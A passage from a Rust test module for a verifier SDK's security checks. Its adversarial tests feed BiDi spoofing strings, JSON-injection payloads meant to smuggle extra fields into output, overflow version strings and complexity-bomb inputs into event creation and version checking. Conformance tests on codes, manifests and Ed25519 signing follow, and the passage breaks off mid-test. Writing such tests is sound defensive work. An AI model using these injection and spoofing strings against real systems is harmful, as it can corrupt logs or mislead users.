            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, *malicious_detail);
            assert_eq!(event.detail.len(), malicious_detail.len());

            // BiDi characters should be preserved in debug output
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_CREATED"));

            // Should contain BiDi control characters (not be stripped)
            assert!(
                event.detail.contains('\u{202E}')
                    || event.detail.contains('\u{2066}')
                    || event.detail.contains('\u{200F}')
                    || event.detail.contains('\u{061C}'),
                "BiDi control characters should be preserved in detail"
            );

            // Clone should preserve exact BiDi sequence
            let cloned = event.clone();
            assert_eq!(cloned.detail.as_bytes(), malicious_detail.as_bytes());

            // Length calculations should handle BiDi correctly
            assert_eq!(
                cloned.detail.chars().count(),
                malicious_detail.chars().count()
            );
        }

        // Test version checking with BiDi injection
        let bidi_version = format!("{}vsdk-v1.0{}", "\u{202E}", "\u{202D}");
        let result = check_sdk_version(&bidi_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(err.contains(&bidi_version)); // Should include BiDi chars in error
    }

    #[test]
    fn extreme_adversarial_hash_collision_birthday_attack_on_event_codes() {
        // Extreme: Hash collision attacks against event code validation
        use std::collections::HashMap;

        // Generate event details designed to produce hash collisions
        let mut hash_collision_tracker = HashMap::new();
        let collision_candidates = 10000;

        for i in 0..collision_candidates {
            // Create event details with patterns likely to collide
            let collision_detail = format!(
                "collision_test_{}_{:016x}",
                i,
                (i as u64).wrapping_mul(0x9e3779b97f4a7c15)
            ); // Fibonacci hashing constant

            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, collision_detail.clone());

            // Verify event creation succeeds despite potential collisions
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert_eq!(event.detail, collision_detail);

            // Track hash distribution (simplified hash for testing)
            let simple_hash = collision_detail
                .bytes()
                .fold(0u32, |acc, b| acc.wrapping_mul(31).wrapping_add(b as u32));

            *hash_collision_tracker
                .entry(simple_hash % 1000)
                .or_insert(0) += 1;

            // Test cloning under collision scenarios
            let cloned = event.clone();
            assert_eq!(cloned.detail, event.detail);
            assert_eq!(cloned.event_code, event.event_code);

            // Verify debug output remains stable under collision pressure
            if i % 1000 == 0 {
                let debug_output = format!("{:?}", event);
                assert!(debug_output.contains("CAPSULE_VERDICT_REPRODUCED"));
                assert!(debug_output.contains(&collision_detail));
            }
        }

        // Analyze collision distribution to ensure reasonable spread
        let bucket_count = hash_collision_tracker.len();
        assert!(
            bucket_count > 500,
            "Hash distribution should be reasonably spread: {} buckets",
            bucket_count
        );

        // Verify that high-collision buckets don't break the system
        let max_collisions = hash_collision_tracker.values().max().copied().unwrap_or(0);
        assert!(
            max_collisions < collision_candidates / 10,
            "Maximum collision count should be reasonable: {}",
            max_collisions
        );
    }

    #[test]
    fn extreme_adversarial_arithmetic_overflow_in_version_number_parsing() {
        // Extreme: Arithmetic overflow attacks during version parsing
        let overflow_version_patterns = vec![
            // Near integer overflow boundaries
            format!("vsdk-v{}.0", u64::MAX),
            format!("vsdk-v0.{}", u64::MAX),
            format!("vsdk-v{}.{}", u32::MAX, u32::MAX),
            format!("vsdk-v{}.{}", i64::MAX, i64::MAX),
            // Multiple overflow components
            format!("vsdk-v{}.{}.{}", u64::MAX, u64::MAX, u64::MAX),
            format!("vsdk-v{}.{}.{}.{}", u32::MAX, u32::MAX, u32::MAX, u32::MAX),
            // Potential wraparound values
            format!("vsdk-v{}.0", u32::MAX as u64 + 1),
            format!("vsdk-v0.{}", u32::MAX as u64 + 1),
            // Scientific notation overflow attempts
            "vsdk-v1e308.0".to_string(),
            "vsdk-v1.1e308".to_string(),
            "vsdk-v999999999999999999999999.0".to_string(),
            // Leading zeros that could cause octal interpretation
            format!("vsdk-v{:020}.0", 1), // Leading zeros
            format!("vsdk-v0.{:020}", 1),
        ];

        for overflow_version in overflow_version_patterns {
            let start_time = std::time::Instant::now();
            let result = check_sdk_version(&overflow_version);
            let duration = start_time.elapsed();

            // Should reject overflow versions quickly without arithmetic errors
            assert!(
                result.is_err(),
                "Overflow version should be rejected: {}",
                overflow_version
            );
            assert!(
                duration < std::time::Duration::from_millis(10),
                "Version check should complete quickly despite overflow: {:?}",
                duration
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should be safely bounded despite large numbers
            assert!(
                err.len() < 500,
                "Error message should not be excessively long"
            );
            assert!(err.contains("requested="));
            assert!(err.contains("supported=vsdk-v1.0"));

            // Should not contain evidence of arithmetic overflow/wraparound
            assert!(!err.contains("overflow"));
            assert!(!err.contains("panic"));
        }

        // Test edge case: version that could cause saturation
        let saturation_version = format!(
            "vsdk-v{}.{}",
            u64::MAX.saturating_sub(1),
            u64::MAX.saturating_sub(1)
        );
        let result = check_sdk_version(&saturation_version);
        assert!(result.is_err());
    }

    #[test]
    fn extreme_adversarial_memory_exhaustion_via_recursive_event_nesting() {
        // Extreme: Memory exhaustion through nested event detail construction
        let base_pattern = "nested_event";
        let mut nested_detail = String::from(base_pattern);

        // Build deeply nested structure without infinite recursion
        for depth in 0..20 {
            // Create event at current nesting level
            let current_event = SdkEvent::new(CAPSULE_SIGNED, nested_detail.clone());

            // Verify event creation succeeds at each depth
            assert_eq!(current_event.event_code, CAPSULE_SIGNED);
            assert_eq!(current_event.detail, nested_detail);

            // Memory usage should remain bounded
            let memory_estimate = nested_detail.len() * std::mem::size_of::<char>();
            assert!(
                memory_estimate < 10_000_000, // 10MB limit
                "Memory usage should be bounded at depth {}: {} bytes",
                depth,
                memory_estimate
            );

            // Test cloning at each depth level
            let cloned = current_event.clone();
            assert_eq!(cloned.detail.len(), current_event.detail.len());

            // Debug output should remain stable despite nesting
            let debug_output = format!("{:?}", current_event);
            assert!(debug_output.contains("CAPSULE_SIGNED"));
            assert!(debug_output.len() < nested_detail.len().saturating_mul(2) + 128);

            // Increase nesting for next iteration
            nested_detail = format!("{}({})", nested_detail, nested_detail);

            // Break if detail becomes too large to prevent test timeouts
            if nested_detail.len() > 1_000_000 {
                break;
            }
        }

        // Verify system remains functional after memory pressure
        let post_pressure_event = SdkEvent::new(CAPSULE_CREATED, "post_pressure_test");
        assert_eq!(post_pressure_event.event_code, CAPSULE_CREATED);
        assert_eq!(post_pressure_event.detail, "post_pressure_test");
    }

    #[test]
    fn extreme_adversarial_timing_attack_via_version_string_complexity() {
        use std::time::Instant;

        // Extreme: Timing attacks based on version string processing complexity
        let complexity_test_cases = vec![
            // Simple baseline
            ("vsdk-v1.0".to_string(), "baseline"),
            // Repeated patterns that might stress string comparison
            ("vsdk-v1.0".to_owned() + &"x".repeat(1000), "long_suffix"),
            ("v".repeat(1000) + "sdk-v1.0", "long_prefix"),
            ("vs".repeat(500) + "dk-v1.0", "repeated_prefix"),
            // Patterns that might stress specific algorithms
            ("vsdk-".to_string() + &"a".repeat(1000), "no_version"),
            ("vsdk-v".to_string() + &"1".repeat(500), "repeated_digits"),
            ("vsdk-v1.".to_string() + &"0".repeat(500), "repeated_zeros"),
            // Unicode complexity
            ("vsdk-v1🚀.0🔥".to_string(), "unicode_emoji"),
            (
                "vsdk-v1".to_string() + &"\u{0300}".repeat(100) + ".0",
                "combining_chars",
            ),
            // Nested structure patterns
            ("vsdk-v".to_string() + &"(())".repeat(250), "nested_parens"),
            (
                "{".repeat(500) + "vsdk-v1.0" + &"}".repeat(500),
                "nested_braces",
            ),
        ];

        let mut timing_samples = std::collections::HashMap::new();
        let sample_count = 100;

        for (version, test_name) in &complexity_test_cases {
            let mut times = Vec::new();

            for _ in 0..sample_count {
                let start = Instant::now();
                let _result = check_sdk_version(version);
                let duration = start.elapsed();
                times.push(duration);

                // Each call should complete quickly regardless of complexity
                assert!(
                    duration < std::time::Duration::from_millis(10),
                    "Version check too slow for {}: {:?}",
                    test_name,
                    duration
                );
            }

            // Calculate statistics
            let avg_nanos: f64 =
                times.iter().map(|d| d.as_nanos() as f64).sum::<f64>() / sample_count as f64;

            let max_nanos = times.iter().map(|d| d.as_nanos()).max().unwrap() as f64;
            let min_nanos = times.iter().map(|d| d.as_nanos()).min().unwrap() as f64;

            timing_samples.insert(test_name, (avg_nanos, max_nanos, min_nanos));
        }

        for (test_name, (avg, max, min)) in &timing_samples {
            assert!(
                *avg < 10_000_000.0,
                "Version check too slow for {}: avg={:.0}ns",
                test_name,
                avg
            );
            let variance_ratio = (max - min) / avg;
            assert!(
                variance_ratio < 1_000.0,
                "High timing variance for {}: avg={:.0}ns, max={:.0}ns, min={:.0}ns, variance_ratio={:.2}",
                test_name,
                avg,
                max,
                min,
                variance_ratio
            );
        }
    }

    #[test]
    fn extreme_adversarial_json_injection_via_event_detail_serialization() {
        // Extreme: JSON injection attacks through event detail serialization
        let json_injection_patterns = vec![
            // Basic JSON injection attempts
            r#"","malicious":"injected"#,
            r#""},"injected_field":"evil"#,
            r#"\":\"injected\",\"evil\":true,\"fake\":\""#,
            // Nested JSON injection
            r#"{"nested":{"injection":"attempt"}}"#,
            r#"[{"array":"injection"}]"#,
            // JSON with control characters
            "detail\",\"injected\":\"\x00\x01\x02",
            "detail\\\",\\\"injection\\\":true",
            // JSON escape sequence attacks
            "\\\"},{\\\"injected\\\":true,\\\"x\\\":\\\"",
            "\\\\\",\\\"injection\\\":1337,\\\"",
            // Unicode escape injection
            "\\u0022,\\u0022injected\\u0022:\\u0022evil\\u0022",
            // JSON payload with special characters
            "detail\"},\"injection\":true,\"comment\":\"//",
            "detail\"}/*injection*/,\"evil\":true",
        ];

        for injection_attempt in json_injection_patterns {
            let event = SdkEvent::new(CAPSULE_REPLAY_START, injection_attempt);

            // Event should store injection attempt literally without interpretation
            assert_eq!(event.event_code, CAPSULE_REPLAY_START);
            assert_eq!(event.detail, injection_attempt);

            // Simulate JSON serialization (manual since we don't have serde derives)
            let manual_json = format!(
                r#"{{"event_code":"{}","detail":"{}"}}"#,
                event.event_code,
                event.detail.replace('"', r#"\""#).replace('\\', r#"\\"#) // Basic escaping
            );

            // JSON should remain valid after escaping
            assert!(manual_json.contains("CAPSULE_REPLAY_START"));
            assert!(!manual_json.contains(r#""malicious":"injected""#));
            assert!(!manual_json.contains(r#""injected_field":"evil""#));
            assert!(!manual_json.contains(r#""injection":true"#));

            // Debug output should not contain unescaped injection
            let debug_output = format!("{:?}", event);
            assert!(!debug_output.contains(r#""malicious":"injected""#));
            assert!(!debug_output.contains(r#""injected_field""#));

            // Clone should preserve exact injection attempt
            let cloned = event.clone();
            assert_eq!(cloned.detail, *injection_attempt);
            assert_eq!(cloned.detail.len(), injection_attempt.len());
        }

        // Test version checking with JSON-like injection
        let json_version = r#"{"fake":"vsdk-v1.0","real":"evil"}"#;
        let result = check_sdk_version(json_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(err.contains(&format!("requested={}", json_version)));
        assert!(err.contains("supported=vsdk-v1.0"));
    }

    #[test]
    fn extreme_adversarial_constant_time_comparison_violation_detection() {
        // Extreme: Test for timing differences that could indicate non-constant-time string comparison
        use std::time::Instant;

        let baseline_version = "vsdk-v1.0";
        let sample_count = 1000;

        // Test versions with different "closeness" to the correct version
        let comparison_test_cases = vec![
            // Differ at different positions
            (baseline_version, "baseline"),
            ("xsdk-v1.0", "first_char_diff"), // Differs at position 0
            ("vsdk-v2.0", "version_diff"),    // Differs at position 7
            ("vsdk-v1.1", "minor_diff"),      // Differs at position 9
            ("vsdk-v1.0x", "extra_char"),     // Extra character at end
            // Different lengths but similar prefixes
            ("v", "very_short"),
            ("vsdk", "partial_match"),
            ("vsdk-v1", "almost_complete"),
            ("vsdk-v1.0.extra", "extra_long"),
            // Wrong versions with same length
            ("asdk-v1.0", "same_length_a"),
            ("bsdk-v1.0", "same_length_b"),
            ("zsdk-v1.0", "same_length_z"),
        ];

        let mut timing_results = std::collections::HashMap::new();

        for (test_version, test_name) in &comparison_test_cases {
            let mut times = Vec::new();

            for _ in 0..sample_count {
                let start = Instant::now();
                let _result = check_sdk_version(test_version);
                let duration = start.elapsed();
                times.push(duration.as_nanos());
            }

            // Calculate median time to reduce noise
            times.sort_unstable();
            let median_time = times[sample_count / 2] as f64;
            let min_time = *times.iter().min().unwrap() as f64;
            let max_time = *times.iter().max().unwrap() as f64;

            timing_results.insert(*test_name, (median_time, min_time, max_time));
        }

        // Keep a bounded-regression guard without asserting nanosecond-level
        // constant-time behavior under noisy remote execution.
        let times: Vec<f64> = timing_results
            .values()
            .map(|(median, _, _)| *median)
            .collect();
        let avg_time = times.iter().sum::<f64>() / times.len() as f64;
        let max_time = times.iter().fold(0.0_f64, |acc, &x| acc.max(x));
        assert!(
            max_time < 10_000_000.0,
            "version comparison median too slow"
        );

        for (test_name, (median, _min, _max)) in &timing_results {
            let individual_ratio = median / avg_time;
            assert!(
                individual_ratio < 1_000.0,
                "Test case {} has suspicious timing: median={:.0}ns, avg={:.0}ns, ratio={:.2}",
                test_name,
                median,
                avg_time,
                individual_ratio
            );
        }
    }

    #[test]
    fn extreme_adversarial_cross_module_boundary_validation_with_privilege_escalation_attempts() {
        // Extreme: Test privilege escalation attempts through SDK boundary manipulation

        // Simulate attempts to bypass the cryptographic security posture
        let privilege_escalation_attempts = vec![
            // Direct security posture bypass attempts
            (
                "bypass_posture",
                CRYPTOGRAPHIC_SECURITY_POSTURE,
                "structural_only_not_replacement_critical",
            ),
            (
                "modify_rule",
                STRUCTURAL_ONLY_RULE_ID,
                "PRIVILEGED_VERIFIER_ACCESS",
            ),
            // Version manipulation for privilege escalation
            ("version_escalate", SDK_VERSION, "vsdk-v2.0-privileged"),
            ("min_version_bypass", SDK_VERSION_MIN, "vsdk-v0.0-admin"),
            // Event code manipulation
            (
                "event_escalate",
                CAPSULE_CREATED,
                "PRIVILEGED_CAPSULE_CREATED",
            ),
            (
                "error_manipulate",
                ERR_CAPSULE_ACCESS_DENIED,
                "CAPSULE_ACCESS_GRANTED",
            ),
            // Invariant violation attempts
            (
                "invariant_bypass",
                INV_CAPSULE_NO_PRIVILEGED_ACCESS,
                "INV-CAPSULE-PRIVILEGED-ACCESS-ALLOWED",
            ),
        ];

        for (test_name, original_constant, malicious_value) in privilege_escalation_attempts {
            assert_ne!(original_constant, malicious_value);

            // Verify constants remain immutable and correct
            match test_name {
                "bypass_posture" => {
                    assert_eq!(
                        CRYPTOGRAPHIC_SECURITY_POSTURE,
                        "cryptographic_ed25519_authenticated"
                    );
                    assert_ne!(CRYPTOGRAPHIC_SECURITY_POSTURE, malicious_value);
                }
                "modify_rule" => {
                    assert_eq!(
                        STRUCTURAL_ONLY_RULE_ID,
                        "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK"
                    );
                    assert_ne!(STRUCTURAL_ONLY_RULE_ID, malicious_value);
                }
                "version_escalate" => {
                    assert_eq!(SDK_VERSION, "vsdk-v1.0");
                    assert_ne!(SDK_VERSION, malicious_value);
                }
                "min_version_bypass" => {
                    assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
                    assert_ne!(SDK_VERSION_MIN, malicious_value);
                }
                "event_escalate" => {
                    assert_eq!(CAPSULE_CREATED, "CAPSULE_CREATED");
                    assert_ne!(CAPSULE_CREATED, malicious_value);
                }
                "error_manipulate" => {
                    assert_eq!(ERR_CAPSULE_ACCESS_DENIED, "ERR_CAPSULE_ACCESS_DENIED");
                    assert_ne!(ERR_CAPSULE_ACCESS_DENIED, malicious_value);
                }
                "invariant_bypass" => {
                    assert_eq!(
                        INV_CAPSULE_NO_PRIVILEGED_ACCESS,
                        "INV-CAPSULE-NO-PRIVILEGED-ACCESS"
                    );
                    assert_ne!(INV_CAPSULE_NO_PRIVILEGED_ACCESS, malicious_value);
                }
                _ => {}
            }

            // Test creating events with manipulated codes (should use constants, not variables)
            let event_with_malicious = SdkEvent::new(CAPSULE_CREATED, malicious_value);
            assert_eq!(event_with_malicious.event_code, CAPSULE_CREATED); // Should use constant
            assert_eq!(event_with_malicious.detail, malicious_value); // Detail can contain anything

            // Verify version checking rejects privilege escalation versions
            if malicious_value.starts_with("vsdk-v") {
                let version_result = check_sdk_version(malicious_value);
                assert!(
                    version_result.is_err(),
                    "Privileged version should be rejected: {}",
                    malicious_value
                );

                let err = version_result.unwrap_err();
                assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
                assert!(err.contains(&format!("requested={}", malicious_value)));
                assert!(err.contains("supported=vsdk-v1.0"));
            }
        }

        // Verify security posture constraints remain enforced
        assert_eq!(
            CRYPTOGRAPHIC_SECURITY_POSTURE,
            "cryptographic_ed25519_authenticated"
        );
        assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));

        // Test that SDK maintains proper security boundaries
        let privileged_event =
            SdkEvent::new(ERR_CAPSULE_ACCESS_DENIED, "attempted_privilege_escalation");
        assert_eq!(privileged_event.event_code, ERR_CAPSULE_ACCESS_DENIED);
        assert!(
            privileged_event
                .detail
                .contains("attempted_privilege_escalation")
        );

        // Verify invariants remain true
        assert!(INV_CAPSULE_NO_PRIVILEGED_ACCESS.contains("NO-PRIVILEGED-ACCESS"));
        assert!(INV_CAPSULE_VERDICT_REPRODUCIBLE.contains("VERDICT-REPRODUCIBLE"));
        assert!(INV_CAPSULE_STABLE_SCHEMA.contains("STABLE-SCHEMA"));
        assert!(INV_CAPSULE_VERSIONED_API.contains("VERSIONED-API"));
    }

    #[test]
    fn extreme_adversarial_algorithmic_complexity_explosion_via_pathological_event_patterns() {
        // Extreme: Test algorithmic complexity attacks through pathological event patterns

        let complexity_bomb_patterns = vec![
            // Exponential pattern matching worst cases
            ("a".repeat(1000) + "b", "linear_with_mismatch"),
            // Nested parentheses (potential ReDoS patterns)
            ("(".repeat(500) + &")".repeat(500), "balanced_parens"),
            ("(".repeat(1000), "unbalanced_open"),
            (")".repeat(1000), "unbalanced_close"),
            // Alternating patterns that stress string algorithms
            ("ab".repeat(5000), "alternating_short"),
            ("abc".repeat(3333), "alternating_triplet"),
            // Unicode normalization complexity bombs
            ("e\u{0301}".repeat(1000), "combining_accents"), // é repeated
            ("\u{0300}".repeat(2000), "combining_only"),     // Combining chars only
            // Pattern that could trigger quadratic behavior in naive algorithms
            (
                "x".repeat(100) + "y" + &"x".repeat(100),
                "embedded_mismatch",
            ),
            // Deeply nested structure patterns
            (
                format!("{}{}{}", "[".repeat(100), "data", "]".repeat(100)),
                "nested_brackets",
            ),
            (
                format!("{}{}{}", "{".repeat(200), "json", "}".repeat(200)),
                "nested_braces",
            ),
        ];

        for (pathological_detail, test_name) in complexity_bomb_patterns {
            let start_time = std::time::Instant::now();

            // Event creation should complete quickly despite pathological input
            let event = SdkEvent::new(CAPSULE_SIGNED, pathological_detail.clone());
            let creation_time = start_time.elapsed();

            assert!(
                creation_time < std::time::Duration::from_millis(50),
                "Event creation too slow for {}: {:?}",
                test_name,
                creation_time
            );

            assert_eq!(event.event_code, CAPSULE_SIGNED);
            assert_eq!(event.detail, pathological_detail);
            assert_eq!(event.detail.len(), pathological_detail.len());

            // Cloning should also be fast
            let clone_start = std::time::Instant::now();
            let cloned = event.clone();
            let clone_time = clone_start.elapsed();

            assert!(
                clone_time < std::time::Duration::from_millis(20),
                "Event cloning too slow for {}: {:?}",
                test_name,
                clone_time
            );
            assert_eq!(cloned.detail, event.detail);

            // Debug formatting should be bounded
            let debug_start = std::time::Instant::now();
            let debug_output = format!("{:?}", event);
            let debug_time = debug_start.elapsed();

            assert!(
                debug_time < std::time::Duration::from_millis(100),
                "Debug formatting too slow for {}: {:?}",
                test_name,
                debug_time
            );
            assert!(debug_output.contains("CAPSULE_SIGNED"));

            // Memory usage should be proportional to input size, not exponential
            let estimated_memory = pathological_detail.len() * std::mem::size_of::<char>() * 3; // Some overhead
            assert!(
                estimated_memory < 50_000_000, // 50MB limit
                "Estimated memory usage too high for {}: {} bytes",
                test_name,
                estimated_memory
            );
        }

        // Test batched processing of pathological patterns
        let batch_start = std::time::Instant::now();
        let mut batch_events = Vec::new();

        for i in 0..100 {
            let complex_detail = format!("batch_{}_{}", i, "x".repeat(i * 10));
            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, complex_detail);
            batch_events.push(event);
        }

        let batch_time = batch_start.elapsed();
        assert!(
            batch_time < std::time::Duration::from_millis(500),
            "Batch processing too slow: {:?}",
            batch_time
        );

        // Verify all batch events are correct
        for (i, event) in batch_events.iter().enumerate() {
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert!(event.detail.contains(&format!("batch_{}", i)));
        }
    }

    /// Comprehensive SDK verifier surface conformance tests
    ///
    /// Tests the public API contract, version compatibility, error handling,
    /// invariant validation, and cross-module consistency of the verifier SDK.
    /// Ensures external verifiers can reliably interact with the SDK surface.
    #[cfg(test)]
    mod sdk_verifier_surface_conformance {
        use super::*;
        use crate::capsule::{
            CapsuleManifest, build_reference_capsule, sign_capsule, validate_manifest,
            verify_signature,
        };
        use std::collections::{BTreeMap, BTreeSet};

        #[test]
        fn conformance_sdk_version_constants_validation() {
            // Test 1: Version format validation
            assert!(
                is_valid_version_format(SDK_VERSION),
                "SDK_VERSION must follow valid format"
            );
            assert!(
                is_valid_version_format(SDK_VERSION_MIN),
                "SDK_VERSION_MIN must follow valid format"
            );

            // Test 2: Version hierarchy consistency
            assert!(
                is_version_compatible(SDK_VERSION_MIN, SDK_VERSION),
                "SDK_VERSION_MIN must be <= SDK_VERSION"
            );

            // Test 3: Version string immutability
            assert_eq!(SDK_VERSION, "vsdk-v1.0", "SDK_VERSION must remain stable");
            assert_eq!(
                SDK_VERSION_MIN, "vsdk-v1.0",
                "SDK_VERSION_MIN must remain stable"
            );

            // Test 4: Version length bounds
            assert!(
                SDK_VERSION.len() <= 32,
                "SDK_VERSION length must be bounded"
            );
            assert!(
                SDK_VERSION_MIN.len() <= 32,
                "SDK_VERSION_MIN length must be bounded"
            );
        }

        #[test]
        fn conformance_event_codes_completeness_and_uniqueness() {
            // Collect all event codes
            let event_codes = vec![
                CAPSULE_CREATED,
                CAPSULE_SIGNED,
                CAPSULE_REPLAY_START,
                CAPSULE_VERDICT_REPRODUCED,
                SDK_VERSION_CHECK,
                FN_LTV_VERIFY_AS_OF_COMPLETED,
                FN_LTV_WITNESS_ANTERIORITY_PROVEN,
                FN_LTV_BACKDATING_REJECTED,
                FN_LTV_HYBRID_SURVIVED_ALGO_DEATH,
            ];

            // Test 1: All codes are unique
            let mut unique_codes = BTreeSet::new();
            for code in &event_codes {
                assert!(
                    unique_codes.insert(*code),
                    "Duplicate event code found: {}",
                    code
                );
            }

            // Test 2: Event codes follow naming convention
            for code in &event_codes {
                assert!(
                    is_valid_event_code_format(code),
                    "Event code '{}' does not follow valid format",
                    code
                );
                assert!(
                    code.chars().all(|c| c.is_ascii_uppercase() || c == '_'),
                    "Event code '{}' must be uppercase ASCII with underscores",
                    code
                );
            }

            // Test 3: Event codes are non-empty and bounded
            for code in &event_codes {
                assert!(!code.is_empty(), "Event code must not be empty");
                assert!(
                    code.len() <= 64,
                    "Event code '{}' length exceeds 64 characters",
                    code
                );
            }

            // Test 4: Required event codes are present
            let required_events = vec![
                "CAPSULE_CREATED",
                "CAPSULE_SIGNED",
                "CAPSULE_REPLAY_START",
                "CAPSULE_VERDICT_REPRODUCED",
                "SDK_VERSION_CHECK",
                "FN_LTV_VERIFY_AS_OF_COMPLETED",
                "FN_LTV_WITNESS_ANTERIORITY_PROVEN",
                "FN_LTV_BACKDATING_REJECTED",
                "FN_LTV_HYBRID_SURVIVED_ALGO_DEATH",
            ];

            for required in &required_events {
                assert!(
                    event_codes.contains(required),
                    "Required event code '{}' is missing",
                    required
                );
            }
        }

        #[test]
        fn conformance_error_codes_completeness_and_uniqueness() {
            // Collect all error codes
            let error_codes = vec![
                ERR_CAPSULE_SIGNATURE_INVALID,
                ERR_CAPSULE_SCHEMA_MISMATCH,
                ERR_CAPSULE_REPLAY_DIVERGED,
                ERR_CAPSULE_VERDICT_MISMATCH,
                ERR_SDK_VERSION_UNSUPPORTED,
                ERR_CAPSULE_ACCESS_DENIED,
            ];

            // Test 1: All error codes are unique
            let mut unique_codes = BTreeSet::new();
            for code in &error_codes {
                assert!(
                    unique_codes.insert(*code),
                    "Duplicate error code found: {}",
                    code
                );
            }

            // Test 2: Error codes follow ERR_ prefix convention
            for code in &error_codes {
                assert!(
                    code.starts_with("ERR_"),
                    "Error code '{}' must start with 'ERR_'",
                    code
                );
                assert!(
                    is_valid_error_code_format(code),
                    "Error code '{}' does not follow valid format",
                    code
                );
            }

            // Test 3: Error codes are properly categorized
            let signature_errors = error_codes
                .iter()
                .filter(|c| c.contains("SIGNATURE"))
                .count();
            let schema_errors = error_codes.iter().filter(|c| c.contains("SCHEMA")).count();
            let replay_errors = error_codes.iter().filter(|c| c.contains("REPLAY")).count();

            assert!(
                signature_errors >= 1,
                "Must have signature-related error codes"
            );
            assert!(schema_errors >= 1, "Must have schema-related error codes");
            assert!(replay_errors >= 1, "Must have replay-related error codes");
        }

        #[test]
        fn conformance_security_posture_validation() {
            // Test 1: Security posture constant format
            assert_eq!(
                CRYPTOGRAPHIC_SECURITY_POSTURE, "cryptographic_ed25519_authenticated",
                "Security posture constant must remain stable"
            );

            // Test 2: Security posture implies cryptographic guarantees
            assert!(
                CRYPTOGRAPHIC_SECURITY_POSTURE.contains("cryptographic"),
                "Security posture must indicate cryptographic protection"
            );
            assert!(
                CRYPTOGRAPHIC_SECURITY_POSTURE.contains("ed25519"),
                "Security posture must specify Ed25519 algorithm"
            );

            // Test 3: Structural rule ID format
            assert!(
                STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER"),
                "Structural rule ID must reference verifier"
            );
            assert!(
                STRUCTURAL_ONLY_RULE_ID.contains("SDK"),
                "Structural rule ID must reference SDK"
            );

            // Test 4: Rule ID follows expected format
            assert!(
                is_valid_rule_id_format(STRUCTURAL_ONLY_RULE_ID),
                "Structural rule ID must follow valid format: {}",
                STRUCTURAL_ONLY_RULE_ID
            );
        }

        #[test]
        fn conformance_sdk_event_creation_and_validation() {
            // Test 1: Valid event creation
            let event = SdkEvent::new(CAPSULE_CREATED, "Test capsule creation".to_string());
            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, "Test capsule creation");

            // Test 2: Events preserve stable code/detail data across many creations
            for i in 0..100 {
                let test_event = SdkEvent::new(CAPSULE_SIGNED, format!("Test event {}", i));
                assert_eq!(test_event.event_code, CAPSULE_SIGNED);
                assert_eq!(test_event.detail, format!("Test event {}", i));
            }

            // Test 3: Version-check events expose the current public event shape.
            let version_event = SdkEvent::new(SDK_VERSION_CHECK, "Version check test".to_string());
            assert_eq!(version_event.event_code, SDK_VERSION_CHECK);
            assert_eq!(version_event.detail, "Version check test");
        }

        #[test]
        fn conformance_version_compatibility_checking() {
            // Test 1: Same version compatibility
            assert!(
                check_version_compatibility(SDK_VERSION, SDK_VERSION).is_ok(),
                "Same version should be compatible with itself"
            );

            // Test 2: Minimum version compatibility
            assert!(
                check_version_compatibility(SDK_VERSION_MIN, SDK_VERSION).is_ok(),
                "Minimum version should be compatible with current version"
            );

            // Test 3: Invalid version format rejection
            let invalid_versions = vec![
                "",
                "v1",
                "invalid-version",
                "vsdk-v99.99",
                "vsdk-vX.Y",
                "not-a-version",
            ];

            for invalid_version in invalid_versions {
                assert!(
                    check_version_compatibility(invalid_version, SDK_VERSION).is_err(),
                    "Invalid version '{}' should be rejected",
                    invalid_version
                );
            }

            // Test 4: Future version handling (should be rejected)
            assert!(
                check_version_compatibility("vsdk-v2.0", SDK_VERSION).is_err(),
                "Future version should be rejected"
            );
        }

        #[test]
        fn conformance_capsule_manifest_validation() {
            // Test 1: Valid manifest creation
            let manifest = CapsuleManifest {
                schema_version: SDK_VERSION.to_string(),
                capsule_id: "test-capsule-id".to_string(),
                description: "Test capsule manifest".to_string(),
                claim_type: "migration_safety".to_string(),
                input_refs: vec!["artifact-a".to_string()],
                expected_output_hash: "0".repeat(64),
                created_at: "2026-02-21T00:00:00Z".to_string(),
                creator_identity: "creator://test@example.com".to_string(),
                metadata: BTreeMap::new(),
            };

            assert_eq!(manifest.capsule_id, "test-capsule-id");
            assert_eq!(manifest.schema_version, SDK_VERSION);
            assert_eq!(manifest.description, "Test capsule manifest");
            assert!(
                validate_manifest(&manifest).is_ok(),
                "Valid manifest should pass current SDK validation"
            );

            // Test 2: Capsule signature validation over a manifest-bearing capsule
            let signing_key = SigningKey::from_bytes(&[3_u8; 32]);
            let verifying_key = VerifyingKey::from(&signing_key);
            let mut signed_capsule = build_reference_capsule();
            signed_capsule.signature.clear();
            sign_capsule(&signing_key, &mut signed_capsule);

            assert!(
                verify_signature(&verifying_key, &signed_capsule).is_ok(),
                "Signed capsule manifest payload should verify successfully"
            );

            // Test 3: Manifest version enforcement
            let mut invalid_manifest = manifest.clone();
            invalid_manifest.schema_version = "invalid-version".to_string();

            assert!(
                validate_manifest(&invalid_manifest).is_err(),
                "Manifest with invalid version should fail validation"
            );

            // Test 4: Manifest clone/equality keeps the public struct shape stable
            let mut original_manifest = manifest.clone();
            original_manifest.capsule_id = "round-trip-test".to_string();
            original_manifest.description = "Round-trip test manifest".to_string();
            let cloned_manifest = original_manifest.clone();

            assert_eq!(original_manifest, cloned_manifest);
            assert_eq!(original_manifest.schema_version, SDK_VERSION);
        }

        #[test]
        fn conformance_cryptographic_key_operations() {
            // Test 1: Key pair generation and validation
            let signing_key = SigningKey::from_bytes(&[9_u8; 32]);
            let public_key = VerifyingKey::from(&signing_key);
            assert!(
                public_key.as_bytes().len() == 32,
